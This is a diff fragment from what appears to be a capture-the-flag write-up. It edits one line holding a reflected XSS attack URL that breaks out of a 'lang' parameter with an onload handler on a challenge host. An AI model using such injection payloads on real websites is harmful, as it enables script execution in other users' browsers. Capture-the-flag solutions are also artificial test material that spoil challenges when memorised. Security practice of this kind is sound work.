@@ -131,7 +131,7 @@ N/A
 Attack URL: http://caloogle.xyz:4140/search?q=ss&lang=en " onload=success("HackedByDedSec") "
 
 ```
-TODO: http://caloogle.xyz:4140/search?q=ss&lang=en ' onload=success("HackedByDedSec") '
+TODO: http://caloogle.xyz:4140/search?q=ss&lang=en " onload=success("HackedByDedSec") "
 ```
 
 # 15. The Early Bird Catches the Worm (3 points)
